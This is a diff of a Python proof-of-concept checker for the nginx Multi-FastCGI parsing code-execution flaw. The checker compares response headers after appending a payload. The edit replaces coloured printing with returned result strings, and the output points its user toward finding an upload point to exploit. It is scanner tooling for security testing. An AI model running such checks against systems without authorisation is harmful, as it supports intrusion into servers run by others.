@@ -8,9 +8,7 @@ description: nginx解析漏洞，代码执行
 '''
 import sys
 import requests
-import warnings
 from bs4 import BeautifulSoup
-from termcolor import cprint
 
 class multi_fastcgi_code_exec_BaseVerify:
     def __init__(self, url):
@@ -55,21 +53,19 @@ class multi_fastcgi_code_exec_BaseVerify:
                     html = requests.get(rurl, timeout=10, verify=False)
                     poc = requests.get(vulnurl + payload, timeout=10, verify=False)
                     if html.headers["Content-Type"] != poc.headers["Content-Type"]:
-                        cprint("[+]存在Nginx Multi-FastCGI Code Execution漏洞...(高危)\tpayload: "+vulnurl+"\t老大去找上传点吧~", "red")
-                        break
+                        return "[+]存在Nginx Multi-FastCGI Code Execution漏洞...(高危)\tpayload: "+vulnurl+"\t老大去找上传点吧~"
             else:
                 rurl = ''.join(turl)
                 vulnurl = rurl + payload
                 html = requests.get(rurl, timeout=10, verify=False)
                 poc = requests.get(vulnurl + payload, timeout=10, verify=False)
                 if html.headers["Content-Type"] != poc.headers["Content-Type"]:
-                    cprint("[+]存在Nginx Multi-FastCGI Code Execution漏洞...(高危)\tpayload: "+vulnurl+"\t老大去找上传点吧~", "red")
-
-
+                    return "[+]存在Nginx Multi-FastCGI Code Execution漏洞...(高危)\tpayload: "+vulnurl+"\t老大去找上传点吧~"
+                else:
+                    return "[-]no vuln"
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-] ====>连接超时"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = multi_fastcgi_code_exec_BaseVerify(sys.argv[1])
     testVuln.run()
